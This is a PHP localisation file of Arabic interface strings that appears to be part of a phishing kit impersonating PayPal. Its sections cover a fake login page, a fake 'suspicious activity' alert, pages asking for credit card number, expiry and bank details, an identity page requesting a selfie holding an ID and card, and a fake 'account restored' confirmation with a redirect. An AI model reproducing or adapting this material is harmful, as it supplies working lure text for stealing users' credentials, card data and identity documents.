<?php

/* صفحة الشكر */

$P1_text1 = 'مبروك';
$P1_text2 = 'ريديركتينغ ...';
$P1_text3 = 'سوماري';
$P1_text4 = 'أكتيفيتي';
$P1_text5 = 'سيند & ريكست';
$P1_text6 = 'واليت';
$P1_text7 = 'شوب';
$P1_text8 = 'لوغ أوت';
$P1_text9 = 'القائمة الرئيسية';
$P1_text10 = 'هيلو أغين!';
$P1_text11 = 'الاستفادة القصوى من باي بال';
$P1_text12 = 'هيلو';
$P1_text13 = 'الدفع أو إرسال الأموال';
$P1_text14 = 'تحميل التطبيق';
$P1_text15 = 'تسوق أكثر أمانا';
$P1_text16 = 'خطوة التحقق';
$P1_text17 = 'تأكيد البطاقة';
$P1_text18 = 'التحقق من الهوية';
$P1_text19 = 'أسيس تو أكونت';
$P1_text20 = 'بايبال بالانس';
$P1_text21 = 'ديتايلز';
$P1_text22 = 'أنت لا تحتاج إلى رصيد للتسوق أو إرسال المدفوعات';
$P1_text23 = 'سحب الأموال';
$P1_text24 = 'سحب الأموال باستخدام البنك المحلي';
$P1_text25 = 'الحسابات المصرفية والبطاقات';
$P1_text26 = 'أضف بطاقتك - نساعد في الحفاظ على معلوماتك أكثر أمنا.';
$P1_text27 = 'إضافة حساب مصرفي أو بطاقة';
$P1_text28 = 'تمت استعادة حق الوصول إلى حسابك بالكامل';
$P1_text29 = 'شكرا لك على اتخاذ الخطوات اللازمة لاستعادة حق الوصول إلى حسابك. تعمل جهودك وجهودك على زيادة الأمان لمنتدى المستخدمين بأكمله. بايبال يأخذ سلامة حسابك، والأعمال التجارية والبيانات المالية بجدية كما تفعل، وهذه الشيكات الجارية من نظامنا يساهم في موقعنا على مستوى عال من الأمن، وسيتم التحقق من حسابك في ال 24 ساعة القادمة. ';
$P1_text30 = 'حسابي';
$P1_text31 = 'سيتم إعادة توجيهك إلى حسابك، بعد 5 ثوان ...';
$P1_text32 = 'حقوق الطبع والنشر © 1999-2017 باي بال. كل الحقوق محفوظة';
$P1_text33 = 'معلومات مفيدة';
$P1_text34 = 'الترقية إلى حساب نشاط تجاري';
$P1_text35 = 'انظر كم يمكنك إرسالها مع باي بال';
$P1_text36 = 'تفضيلات البائع';
$P1_text37 = 'أدرس';
$P1_text38 = 'سيتي';
$P1_text39 = 'ستات';
$P1_text40 = 'زيب';
$P1_text41 = 'البلد';
$P1_text42 = 'كونفيرم بانك إنفورماتيون:';
$P1_text43 = 'أدخل (المعلومات المصرفية الشخصية) لتأكيد حسابك';
$P1_text44 = 'هذه المعلومات تبقى سرية';

/* نشاط آمن */

$P2_text1 = 'أنشطة مشبوهة';
$P2_text2 = 'للمساعدة في حماية حسابك، نبحث بانتظام عن علامات مبكرة للنشاط المحتمل الاحتيالي.';
$P2_text3 = 'نحن قلقون بشأن النشاط المحتمل غير المصرح به';
$P2_text4 = 'بعد تأكيد هويتك، سنرشدك عبر الخطوات لجعل حسابك أكثر أمانا.';
$P2_text5 = 'تسجيل الدخول من جهاز غير معروف';
$P2_text6 = 'بالقرب من مانساس، فا';
$P2_text7 = 'فقط لكي نكون آمنين، نريد التأكد من أن هذا هو حسابك.';
$P2_text8 = 'كونتاكت';
$P2_text9 = 'سيكوريتي';
$P2_text10 = 'حقوق التأليف والنشر © 1999 - 2017 بايبال. كل الحقوق محفوظة.';
$P2_text11 = 'الخصوصية';
$P2_text12 = 'قانونية';


/* سيغنين بادج */
$P3_text1 = 'سجل الدخول إلى حسابك في بايبال';
$P3_text2 = 'بايبال';
$P3_text3 = 'تسجيل الدخول إلى حسابك';
$P3_text4 = 'بعض المعلومات الخاصة بك غير صحيحة. حاول مرة اخرى.';
$P3_text5 = 'عنوان البريد الإلكتروني';
$P3_text6 = 'عنوان البريد الإلكتروني مطلوب.';
$P3_text7 = 'تنسيق البريد الإلكتروني هذا لا يبدو صحيحا';
$P3_text8 = 'باسورد';
$P3_text9 = 'كلمة المرور مطلوبة';
$P3_text10 = 'تسجيل الدخول';
$P3_text11 = 'هل تواجه مشكلة في تسجيل الدخول؟';
$P3_text12 = 'التحقق من المعلومات الخاصة بك ...';
$P3_text13 = 'مجرد ثانية ...';


/* فف بادج */

$P4_text1 = 'مجرد لحظة ...';
$P4_text2 = 'عزيزي';
$P4_text3 = 'نحن يحمي بطاقتك ضد الاستخدام غير المصرح به على الانترنت لديك مشيرا إلى الخوف. نحن نضمن فقط أنك المالك القانوني لهذا الحساب. ';
$P4_text4 = 'الرجاء إدخال معلوماتك بشكل صحيح:';
$P4_text5 = 'رقم البطاقة';
$P4_text6 = 'كوبيرايت © 1999';
$P4_text7 = 'جميع الحقوق محفوظة';


/* كارد بادج */

$P5_text1 = 'ريديركتينغ ...';
$P5_text2 = 'أنت لا تحتاج إلى رصيد للتسوق أو إرسال المدفوعات';
$P5_text3 = 'سحب الأموال';
$P5_text4 = 'سحب الأموال باستخدام البنك المحلي';
$P5_text5 = 'الحسابات المصرفية والبطاقات';
$P5_text6 = 'مجرد لحظة ...';
$P5_text7 = 'معلومات بطاقة الائتمان:';
$P5_text8 = 'فيرست نيم';
$P5_text9 = 'اسم العائلة';
$P5_text10 = 'رقم البطاقة';
$P5_text11 = 'تاريخ انتهاء الصلاحية';
$P5_text12 = 'تحتاج إلى تأكيد المعلومات الخاصة بك لتكون قادرة على إصلاح هذه المشكلة والوصول إلى حسابك';
$P5_text13 = 'الحصول على رواتب أسرع';
$P5_text14 = 'تقليل دورة المبيعات من أسابيع إلى دقائق';
$P5_text15 = 'القبض على المدفوعات';
$P5_text16 = 'قبول المدفوعات بسرعة عن طريق بطاقة الائتمان والخصم، أو تتبع النقدية والتحقق من المعاملات في كل حساب واحد';
$P5_text17 = 'التبرعات';
$P5_text18 = 'ما إذا كنت ستذهب الباب إلى الباب، أو فقط على زاوية مشغول، والتقاط التبرعات بسرعة مع الهاتف الذكي أو الكمبيوتر اللوحي وإرسال إيصالات في الوقت الحقيقي.';
$P5_text19 = 'حقوق الطبع والنشر © 1999-2017 باي بال. كل الحقوق محفوظة';
$P5_text20 = 'بايبال بالانس';
$P5_text21 = 'ديتايلز';

/* صفحة الهوية */

$P6_text1 = 'التحقق من الهوية';
$P6_text2 = 'تأكيد الهوية';
$P6_text3 = 'نحن مطالبون بالحصول على بعض الوثائق الأساسية قبل أن نتمكن من التحقق من حسابك';
$P6_text4 = 'يرجى تقديم نسخة من وثيقة واحدة من الوثائق التالية:';
$P6_text5 = 'الرجاء تحديد ملف للمتابعة.';
$P6_text6 = 'بطاقة الائتمان';
$P6_text7 = 'أو بطاقة الهوية';
$P6_text8 = 'أو رخصة القيادة';
$P6_text9 = 'ستساعدنا وثائق إثبات الهوية في التحقق من هويتك.';
$P6_text10 = 'ما يجب القيام به، لتأكيد هويتي؟';
$P6_text11 = 'خذ سيلفي من خلال عقد بطاقة الهوية الخاصة بك أيضا بطاقتك';
$P6_text12 = 'يجب أن يكون اسم حامل البطاقة وبطاقة الهوية متطابقين وأن يكونا مرئيين بوضوح';
$P6_text13 = 'يجب أن تكون وثيقة إثبات الهوية بجوار وجهك';